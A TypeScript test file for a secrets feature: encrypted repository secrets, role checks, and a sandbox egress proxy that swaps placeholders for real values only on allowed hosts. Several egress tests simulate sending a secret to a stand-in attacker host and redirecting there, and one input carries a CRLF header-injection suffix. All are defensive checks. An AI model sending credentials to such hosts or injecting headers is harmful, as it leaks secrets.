// Repository secrets end to end in the Worker (docs/features/secrets.md): an Admin's writes through the real routes and
// the real `secret/Put` and `secret/Delete` on the Node host's engine, the shape of names, and a box's requests through
// the egress, on the compose Postgres and Electric. The hosts a box reaches are scripted at the network. Every test
// also searches what was recorded and stored for the value, in every form an echo may take.
import { Action } from "@smthrs/flow"
import { Placeholder } from "@smthrs/secrets"
import { ConfigProvider, Effect, Option, Redacted } from "effect"
import { SqlClient } from "effect/sql"
import { afterAll, beforeAll, beforeEach, describe, expect, test } from "vitest"
import * as Database from "../../db/Database.ts"
import * as TestDatabase from "../../db/TestDatabase.ts"
import { parseSecretRoute, SECRETS_SHAPE_ROUTE, secretRoute } from "../../src/features/secrets/contract.ts"
import * as Actor from "../Actor.ts"
import * as RegistryEgress from "../branch/RegistryEgress.ts"
import * as Flows from "../Flows.ts"
import { eventually, testFile } from "../test/harness.ts"
import * as SecretsApi from "./Api.ts"
import * as Keys from "./Keys.ts"
import * as SandboxEgress from "./SandboxEgress.ts"
import * as SecretFlows from "./SecretFlows.ts"
import * as Store from "./Store.ts"
import {
  admin,
  agent,
  dump,
  engine,
  events,
  leaks,
  member,
  REPO,
  REPO_ID,
  resetSecrets,
  rows,
  secretsHarness,
  VALUE,
} from "./test/harness.ts"

const runtime = testFile("secrets")
let host: Awaited<ReturnType<typeof engine>>
beforeAll(async () => {
  host = await engine(runtime)
})
afterAll(() => host.close())
beforeEach(() => resetSecrets(runtime))

const open = (options: Parameters<typeof secretsHarness>[2] = {}) => secretsHarness(runtime, host.starter, options)

const path = (secret = "STRIPE_KEY") => secretRoute(REPO.owner, REPO.name, secret)

const put = (body: unknown, init: RequestInit = {}) => ({
  method: "PUT",
  headers: { "content-type": "application/json" },
  body: typeof body === "string" ? body : JSON.stringify(body),
  ...init,
})

const json = async (response: Response) => [response.status, await response.json()] as const

describe("PUT and DELETE /api/repos/<owner>/<name>/secrets/<NAME>", () => {
  test("an Admin sets, replaces and deletes a secret; Postgres and the journal hold only ciphertext", async () => {
    const h = await open({ actor: admin })

    expect(await json(await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] })))).toEqual([
      202,
      { name: "STRIPE_KEY" },
    ])
    const [set] = await rows(runtime)
    expect(set).toMatchObject({
      repoId: REPO_ID,
      name: "STRIPE_KEY",
      keyVersion: 1,
      hosts: ["api.stripe.com"],
      methods: null,
      updatedBy: "person-admin",
    })
    expect(set!.ciphertext).not.toContain("SENTINEL")

    expect(
      (await h.fetch(path(), put({ value: `${VALUE}-2`, hosts: ["api.stripe.com", "files.stripe.com"], methods: ["POST"] })))
        .status,
    ).toBe(202)
    const [replaced] = await rows(runtime)
    expect(replaced).toMatchObject({ hosts: ["api.stripe.com", "files.stripe.com"], methods: ["POST"] })
    expect(replaced!.ciphertext).not.toBe(set!.ciphertext)

    expect(await json(await h.fetch(path(), { method: "DELETE" }))).toEqual([202, { name: "STRIPE_KEY" }])
    expect(await rows(runtime)).toEqual([])
    expect((await h.fetch(path(), { method: "DELETE" })).status).toBe(202)

    expect((await events(runtime)).map((event) => [event.action, event.names, event.actorId])).toEqual([
      ["set", ["STRIPE_KEY"], "person-admin"],
      ["replace", ["STRIPE_KEY"], "person-admin"],
      ["delete", ["STRIPE_KEY"], "person-admin"],
      ["delete", ["STRIPE_KEY"], "person-admin"],
    ])
    expect(host.exits.slice(-4).map((exit) => exit._tag)).toEqual(["Success", "Success", "Success", "Success"])
    expect(h.count(SecretsApi.requests, { op: "put", outcome: "putting" })).toBe(2)
    expect(h.count(SecretsApi.requests, { op: "delete", outcome: "deleting" })).toBe(2)

    // The value never reached a table, the flow journal, a log line, a span or a metric.
    expect(leaks(await dump(runtime, host.schema))).toEqual([])
    expect(leaks(await dump(runtime, await scratchName()))).toEqual([])
    expect(leaks(h.recorded(), [VALUE, `${VALUE}-2`])).toEqual([])
  })

  test("a stored value opens only under its own repository and name", async () => {
    const h = await open({ actor: admin })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const [row] = await rows(runtime)
    const keys = await Effect.runPromise(Keys.make(Redacted.make("0123456789abcdef".repeat(4))))
    const opened = await Effect.runPromise(keys.cipher.open(row!, { id: REPO_ID, name: "STRIPE_KEY", version: 1 }))
    expect(Redacted.value(opened)).toBe(VALUE)
    for (const context of [{ id: "github/acme/other", name: "STRIPE_KEY", version: 1 }, { id: REPO_ID, name: "OTHER", version: 1 }]) {
      expect((await Effect.runPromiseExit(keys.cipher.open(row!, context)))._tag).toBe("Failure")
    }
  })

  test.each([
    ["nobody signed in", null, 401, "authentication"],
    ["a Member", member, 403, "forbidden"],
    ["an agent acting for an Admin", agent, 403, "forbidden"],
  ] as const)("%s can't write a secret", async (_, actor, status, code) => {
    const h = await open({ actor })
    expect(await json(await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] })))).toEqual([status, { code }])
    expect(await json(await h.fetch(path(), { method: "DELETE" }))).toEqual([status, { code }])
    expect(await rows(runtime)).toEqual([])
    expect(leaks(h.recorded())).toEqual([])
  })

  test.each([
    ["a lowercase name", path("stripe_key"), put({ value: VALUE, hosts: ["api.stripe.com"] }), 400, "invalid_name"],
    ["an IP host", path(), put({ value: VALUE, hosts: ["10.0.0.1"] }), 400, "invalid_hosts"],
    ["a wildcard host", path(), put({ value: VALUE, hosts: ["*.stripe.com"] }), 400, "invalid_hosts"],
    ["no host", path(), put({ value: VALUE, hosts: [] }), 400, "invalid_hosts"],
    ["an unknown method", path(), put({ value: VALUE, hosts: ["a.com"], methods: ["TRACE"] }), 400, "invalid_hosts"],
    ["a short value", path(), put({ value: "short", hosts: ["a.com"] }), 400, "too_short"],
    ["a value over 16 KiB", path(), put({ value: "v".repeat(16 * 1024 + 1), hosts: ["a.com"] }), 400, "too_long"],
    ["a value with a line break", path(), put({ value: `${VALUE}\r\nX: 1`, hosts: ["a.com"] }), 400, "control_character"],
    ["a broken surrogate", path(), put({ value: `${VALUE}\ud800`, hosts: ["a.com"] }), 400, "malformed_text"],
    ["a body that isn't JSON", path(), put(`{"value":"${VALUE}"`), 400, "invalid"],
    ["a body with no hosts", path(), put({ value: VALUE }), 400, "invalid"],
    ["a body over 32 KiB", path(), put({ value: VALUE, hosts: ["a.com"], pad: "x".repeat(33 * 1024) }), 413, "too_large"],
    ["a body that isn't UTF-8", path(), { method: "PUT", body: new Uint8Array([0x7b, 0xff, 0xfe, 0x7d]) }, 400, "invalid"],
  ] as const)("%s is refused, and nothing is written or recorded with the value", async (_, route, init, status, code) => {
    const h = await open({ actor: admin })
    expect(await json(await h.fetch(route, init))).toEqual([status, { code }])
    expect(await rows(runtime)).toEqual([])
    expect(await events(runtime)).toEqual([])
    expect(leaks(h.recorded())).toEqual([])
  })

  test("another repository's secrets are not found: a session's role is for its own repository", async () => {
    const h = await open({ actor: admin })
    const other = secretRoute("acme", "other", "STRIPE_KEY")
    expect(await json(await h.fetch(other, put({ value: VALUE, hosts: ["a.com"] })))).toEqual([404, { code: "not_found" }])
    expect(await json(await h.fetch(other, { method: "DELETE" }))).toEqual([404, { code: "not_found" }])
    expect(await rows(runtime)).toEqual([])
  })

  test("another method is 405, and with secrets off every write is 503 off", async () => {
    const h = await open({ actor: admin })
    const response = await h.fetch(path(), { method: "GET" })
    expect([response.status, response.headers.get("allow")]).toEqual([405, "PUT, DELETE"])
    const off = await open({ actor: admin, keys: false })
    expect(await json(await off.fetch(path(), put({ value: VALUE, hosts: ["a.com"] })))).toEqual([503, { code: "off" }])
  })

  test("a flow that can't start is 503 unavailable, and the value is recorded nowhere", async () => {
    const down = Flows.FlowStarter.of({ start: () => Effect.fail(new Flows.StartUnavailable({ errorCode: "do" })) })
    const h = await open({ actor: admin, starter: down })
    expect(await json(await h.fetch(path(), put({ value: VALUE, hosts: ["a.com"] })))).toEqual([503, { code: "unavailable" }])
    expect(await json(await h.fetch(path(), { method: "DELETE" }))).toEqual([503, { code: "unavailable" }])
    const thrown = Flows.FlowStarter.of({ start: () => Effect.die(new Error(`boom ${VALUE}`)) })
    const broken = await open({ actor: admin, starter: thrown })
    expect(await json(await broken.fetch(path(), put({ value: VALUE, hosts: ["a.com"] })))).toEqual([
      503,
      { code: "unavailable" },
    ])
    expect(leaks(h.recorded() + broken.recorded())).toEqual([])
  })

  test("a step run again records its change once", async () => {
    const database = (await runtime.runPromise(Effect.service(TestDatabase.Scratch))).database
    const write = {
      repoId: REPO_ID,
      name: "K",
      ciphertext: "c",
      nonce: "n",
      keyVersion: 1,
      hosts: ["a.com"],
      methods: undefined,
      actorId: "person-admin",
      invocationKey: "step-1",
    }
    const run = <A>(effect: Effect.Effect<A, unknown, any>) => runtime.runPromise(Effect.provide(effect, database) as Effect.Effect<A>)
    expect(await run(Store.put(write))).toBe("set")
    expect(await run(Store.put(write))).toBe("repeat")
    const remove = { repoId: REPO_ID, name: "K", actorId: "person-admin", invocationKey: "step-2" }
    expect(await run(Store.remove(remove))).toBe("deleted")
    expect(await run(Store.remove(remove))).toBe("repeat")
    expect((await events(runtime)).map((event) => event.action)).toEqual(["set", "delete"])
    expect(JSON.stringify(await runtime.runPromiseExit(Effect.provide(Store.sealed(REPO_ID, "K"), database))))
      .toContain("@smthrs/mvp/secrets/Missing")
  })

  test("a step whose database can't be reached fails as StoreUnavailable, which the engine retries", async () => {
    const unreachable = Database.layer(Effect.succeed(Redacted.make("postgresql://smithers:smithers@127.0.0.1:1/smithers")))
    const { store, erase } = SecretFlows.steps(unreachable)
    const keyed = <A, E>(effect: Effect.Effect<A, E, any>) =>
      Effect.runPromiseExit(Effect.provideService(effect, Action.CurrentInvocationKey, "step-1") as Effect.Effect<A, E>)
    const sealed = { ciphertext: "c", nonce: "n" }
    const put = await keyed(store({ repoId: REPO_ID, name: "K", sealed, keyVersion: 1, hosts: ["a.com"], actorId: "p" }))
    const removed = await keyed(erase({ repoId: REPO_ID, name: "K", actorId: "p" }))
    for (const exit of [put, removed]) expect(JSON.stringify(exit)).toContain("@smthrs/mvp/secrets/StoreUnavailable")
    expect(SecretFlows.STORE_RETRY).toMatchObject({ expirationMs: 30 * 60_000 })
  })

  test("a step with no invocation key dies rather than record its change twice", async () => {
    const database = (await runtime.runPromise(Effect.service(TestDatabase.Scratch))).database
    const { store, erase } = SecretFlows.steps(database)
    const sealed = { ciphertext: "c", nonce: "n" }
    const exits = [
      await Effect.runPromiseExit(store({ repoId: REPO_ID, name: "K", sealed, keyVersion: 1, hosts: ["a.com"], actorId: "p" }) as Effect.Effect<unknown, unknown>),
      await Effect.runPromiseExit(erase({ repoId: REPO_ID, name: "K", actorId: "p" }) as Effect.Effect<unknown, unknown>),
    ]
    for (const exit of exits) expect(JSON.stringify(exit)).toContain("NoInvocationKey")
    expect(await rows(runtime)).toEqual([])
  })
})

describe("GET /api/shapes/secrets", () => {
  const values = async (h: Awaited<ReturnType<typeof open>>, query: string, count: number) => {
    const found: Array<Record<string, unknown>> = []
    let at = "offset=-1"
    await eventually(async () => {
      const response = await h.fetch(`${SECRETS_SHAPE_ROUTE}?${query}&${at}`)
      expect(response.status).toBe(200)
      for (const message of (await response.json()) as Array<{ readonly value?: Record<string, unknown> }>) {
        if (message.value !== undefined) found.push(message.value)
      }
      at = `offset=${response.headers.get("electric-offset")}&handle=${response.headers.get("electric-handle")}`
      return found.length >= count
    }, 10_000)
    return found
  }

  test("a Member reads a repository's names, hosts and methods, never the ciphertext", async () => {
    await (await open({ actor: admin })).fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"], methods: ["GET"] }))
    const h = await open({ actor: member })
    const [row] = await values(h, `repo=${REPO_ID.toUpperCase()}`, 1)
    expect(Object.keys(row!).sort()).toEqual(["hosts", "methods", "name", "repo_id", "updated_at"])
    // Electric sends an array column in Postgres' text form.
    expect(row).toMatchObject({ repo_id: REPO_ID, name: "STRIPE_KEY", hosts: "{api.stripe.com}", methods: "{GET}" })
    expect(h.electric[0]!.searchParams.get("columns")).toBe("repo_id,name,hosts,methods,updated_at")
  })

  test("someone signed out or without a role, or naming another repository, gets no rows", async () => {
    await (await open({ actor: admin })).fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    for (const actor of [null, { ...member, role: null }] as const) {
      const h = await open({ actor })
      const response = await h.fetch(`${SECRETS_SHAPE_ROUTE}?offset=-1&repo=${REPO_ID}`)
      expect(response.status).toBe(200)
      expect(((await response.json()) as Array<{ readonly value?: unknown }>).filter((m) => m.value !== undefined)).toEqual([])
      expect(h.electric[0]!.searchParams.get("params[1]")).toBe("")
    }
    for (const query of ["", "&repo=github/acme/other"]) {
      const h = await open({ actor: member })
      expect((await h.fetch(`${SECRETS_SHAPE_ROUTE}?offset=-1${query}`)).status).toBe(200)
      expect(h.electric[0]!.searchParams.get("params[1]")).toBe("")
    }
  })
})

describe("the sandbox egress", () => {
  const guest = { repoId: REPO_ID, branchId: "branch-1", generation: 3 }
  const seen: Array<{ readonly url: string; readonly headers: Record<string, string>; readonly redirect?: string }> = []
  const upstream: typeof globalThis.fetch = async (input, init) => {
    const request = new Request(input, init)
    seen.push({ url: request.url, headers: Object.fromEntries(request.headers), redirect: init?.redirect })
    const url = new URL(request.url)
    if (url.pathname === "/redirect") {
      return new Response(null, { status: 302, headers: { location: "https://collector.evil.example/" } })
    }
    // An echo service: it answers with what it received.
    return new Response(`you sent ${request.headers.get("authorization")} and ${btoa(request.headers.get("authorization") ?? "")}`)
  }
  beforeEach(() => void (seen.length = 0))

  const placeholderOf = async (h: Awaited<ReturnType<typeof open>>, target = guest) =>
    /^STRIPE_KEY=(.+)$/m.exec(await h.environment(target))![1]!

  test("a box's placeholder reaches its secret's host as the value, and the answer comes back scrubbed", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const placeholder = await placeholderOf(h)
    expect(Placeholder.is(placeholder)).toBe(true)
    expect(await h.environment(guest)).toBe(`STRIPE_KEY=${placeholder}\n`)

    const response = await h.egress(guest)(
      new Request("https://api.stripe.com/v1/charges", { headers: { authorization: `Bearer ${placeholder}` } }),
    )
    const body = await response.text()
    expect(response.status).toBe(200)
    expect(seen[0]!.headers.authorization).toBe(`Bearer ${VALUE}`)
    expect(seen[0]!.redirect).toBe("manual")
    expect(body).toContain(placeholder)
    expect(leaks(body)).toEqual([])
    expect((await events(runtime)).at(-1)).toMatchObject({
      action: "use",
      names: ["STRIPE_KEY"],
      scope: "branch-1:3",
      host: "api.stripe.com",
      method: "GET",
      outcome: "forwarded",
    })
    expect(leaks(h.recorded())).toEqual([])
    expect(leaks(await dump(runtime, await scratchName()))).toEqual([])
  })

  test("a box on a branch whose repository is named in capitals gets that repository's placeholders", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const box = SandboxEgress.guestOf({ owner: "Acme", name: "Widgets", branchId: guest.branchId }, guest.generation)
    expect(box).toEqual(guest)
    expect(await h.environment(box)).toMatch(/^STRIPE_KEY=smthrs-secret-[0-9a-f]{64}\n$/)
  })

  test("another host, another method, an earlier generation's placeholder and a redirect get no value", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"], methods: ["GET"] }))
    const placeholder = await placeholderOf(h)
    const earlier = await placeholderOf(h, { ...guest, generation: 2 })
    expect(earlier).not.toBe(placeholder)
    const box = h.egress(guest)

    const elsewhere = await box(new Request("https://collector.evil.example/", { headers: { "x-key": placeholder } }))
    expect([elsewhere.status, await elsewhere.text()]).toEqual([403, "host_not_allowed"])
    const posted = await box(
      new Request("https://api.stripe.com/", { method: "POST", headers: { authorization: `Bearer ${placeholder}` } }),
    )
    expect([posted.status, await posted.text()]).toEqual([403, "secret_not_allowed"])
    const stale = await box(new Request("https://api.stripe.com/", { headers: { authorization: `Bearer ${earlier}` } }))
    expect([stale.status, await stale.text()]).toEqual([403, "unknown_placeholder"])
    const redirected = await box(
      new Request("https://api.stripe.com/redirect", { headers: { authorization: `Bearer ${placeholder}` } }),
    )
    expect([redirected.status, redirected.headers.get("location")]).toEqual([302, "https://collector.evil.example/"])

    expect(seen.map((request) => new URL(request.url).hostname)).toEqual(["api.stripe.com"])
    expect((await events(runtime)).filter((event) => event.action === "use").map((event) => [event.host, event.outcome]))
      .toEqual([
        ["collector.evil.example", "host_not_allowed"],
        ["api.stripe.com", "secret_not_allowed"],
        ["api.stripe.com", "unknown_placeholder"],
        ["api.stripe.com", "forwarded"],
      ])
  })

  test("EGRESS_ALLOW_HOSTS lets a box reach a host with no secret; anything else answers off or unavailable", async () => {
    const config: Record<string, string> = { EGRESS_ALLOW_HOSTS: "api.example.com, not a host" }
    const allowed = await open({ upstream, config })
    delete config.EGRESS_ALLOW_HOSTS
    expect((await allowed.egress(guest)(new Request("https://api.example.com/left-pad"))).status).toBe(200)
    expect(seen).toHaveLength(1)
    const unset = await open({ upstream })
    expect((await unset.egress(guest)(new Request("https://api.example.com/left-pad"))).status).toBe(403)
    expect(seen).toHaveLength(1)

    const off = await open({ upstream, keys: false })
    expect(await off.environment(guest)).toBe("")
    const answer = await off.egress(guest)(new Request("https://registry.npmjs.org/"))
    expect([answer.status, await answer.text()]).toEqual([503, "off"])

    const unreachable = Database.layer(Effect.succeed(Redacted.make("postgresql://smithers:smithers@127.0.0.1:1/smithers")))
    const down = await open({ upstream, database: unreachable })
    const failed = await down.egress(guest)(new Request("https://registry.npmjs.org/"))
    expect([failed.status, await failed.text()]).toEqual([503, "unavailable"])
  })

  test("with secrets on, a box still reaches every package registry, and EGRESS_ALLOW_HOSTS adds to them", async () => {
    const h = await open({ upstream })
    for (const registry of RegistryEgress.HOSTS) {
      expect((await h.egress(guest)(new Request(`https://${registry}/`))).status, registry).toBe(200)
    }
    expect(seen.map((request) => new URL(request.url).hostname)).toEqual([...RegistryEgress.HOSTS])
    const allowed = (value: string) =>
      Effect.runSync(SandboxEgress.allowHosts.parse(ConfigProvider.fromUnknown({ EGRESS_ALLOW_HOSTS: value })))
    expect(allowed("")).toEqual([...RegistryEgress.HOSTS])
    expect(allowed("pypi.org, api.example.com, not a host")).toEqual([...RegistryEgress.HOSTS, "api.example.com"])
  })

  test("a decision Postgres refuses to record is never sent", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const placeholder = await placeholderOf(h)
    const constraint = (statement: string) =>
      runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) => sql.unsafe(statement)))
    await constraint(`ALTER TABLE secret_events ADD CONSTRAINT no_use CHECK (action <> 'use') NOT VALID`)
    try {
      const answer = await h.egress(guest)(
        new Request("https://api.stripe.com/", { headers: { authorization: `Bearer ${placeholder}` } }),
      )
      expect([answer.status, await answer.text()]).toEqual([503, "audit"])
      expect(seen).toEqual([])
    } finally {
      await constraint(`ALTER TABLE secret_events DROP CONSTRAINT no_use`)
    }
  })

  test("a sealed value that doesn't open sends nothing", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const placeholder = await placeholderOf(h)
    // A changed ciphertext fails authentication.
    await runtime.runPromise(
      Effect.flatMap(SqlClient.SqlClient, (sql) => sql`UPDATE secrets SET ciphertext = 'AAAA' || substr(ciphertext, 5)`),
    )
    const answer = await h.egress(guest)(
      new Request("https://api.stripe.com/", { headers: { authorization: `Bearer ${placeholder}` } }),
    )
    expect([answer.status, await answer.text()]).toEqual([503, "secret"])
    expect(seen).toEqual([])
    expect(leaks(h.recorded())).toEqual([])
  })
})

describe("Keys", () => {
  test("SECRETS_KEY turns secrets on; without it, or with a short one, they are off", async () => {
    const read = (config: Record<string, string>) =>
      Effect.runPromise(
        Effect.service(Keys.SecretKeys).pipe(
          Effect.provide(Keys.SecretKeys.layerConfig),
          Effect.provideService(ConfigProvider.ConfigProvider, ConfigProvider.fromUnknown(config)),
        ),
      )
    expect(Option.isNone(await read({}))).toBe(true)
    expect(Option.isNone(await read({ SECRETS_KEY: "k".repeat(31) }))).toBe(true)
    expect(Option.isSome(await read({ SECRETS_KEY: "k".repeat(32) }))).toBe(true)
    expect((await Effect.runPromiseExit(Keys.make(Redacted.make("short"))))._tag).toBe("Failure")
  })

  test("only an Admin acting in person may write", () => {
    expect([admin, member, agent].map(SecretsApi.mayWrite)).toEqual([true, false, false])
    expect(Actor.canAsk(member)).toBe(true)
  })
})

describe("the route contract", () => {
  test("a secret's path round-trips; anything else isn't one", () => {
    expect(parseSecretRoute(secretRoute("o w", "n/x", "K"))).toEqual({ owner: "o w", name: "n/x", secret: "K" })
    expect(parseSecretRoute("/api/repos/o/n/secrets")).toBeUndefined()
    expect(parseSecretRoute("/api/repos/o/n/secrets/%E0%A4%A")).toBeUndefined()
    expect(SecretsApi.handles(SECRETS_SHAPE_ROUTE)).toBe(true)
    expect(SecretsApi.handles("/api/repos/o/n/tree/main")).toBe(false)
  })
})

/** The file's own schema name. */
const scratchName = async () => (await runtime.runPromise(Effect.service(TestDatabase.Scratch))).name
